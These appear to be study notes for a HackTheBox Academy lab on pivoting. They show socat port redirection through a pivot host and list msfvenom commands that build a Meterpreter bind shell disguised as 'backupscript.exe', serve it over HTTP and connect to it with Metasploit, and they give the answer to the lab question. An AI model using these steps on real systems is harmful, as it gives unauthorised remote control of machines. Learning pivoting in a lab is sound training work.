# Socat Redirection with a Bind Shell

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1429](https://academy.hackthebox.com/module/158/section/1429) |

---

## 🔑 Key Concepts

- **Bind Shell** — target listens, attacker connects (opposite of reverse shell)
- **Socat** redirects attacker's connection from pivot host to Windows target
- No SSH tunnel needed

## 🛠️ Key Commands

### Start Socat Redirector on Pivot Host
```bash
socat TCP4-LISTEN:8080,fork TCP4:<windows_target_ip>:8443
# Listens on 8080, forwards to Windows target port 8443
```

### Generate Bind Shell Payload
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp \
  RHOST=<windows_target_ip> \
  LPORT=8443 \
  -f exe -o backupscript.exe
```

### Transfer & Execute Payload on Windows Target
```bash
# From pivot host
python3 -m http.server 8123
# On Windows: download and run backupscript.exe
```

### Metasploit Handler (connect to pivot host)
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost <pivot_host_ip>
set lport 8080
run
```

### Flow
```
Attack host → pivot_host:8080 → socat → Windows Target:8443 → Bind Shell
```

---

## ❓ Questions

### Q1 — What Meterpreter payload was used for the bind shell session?
**Answer:** `windows/x64/meterpreter/bind_tcp`

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
```
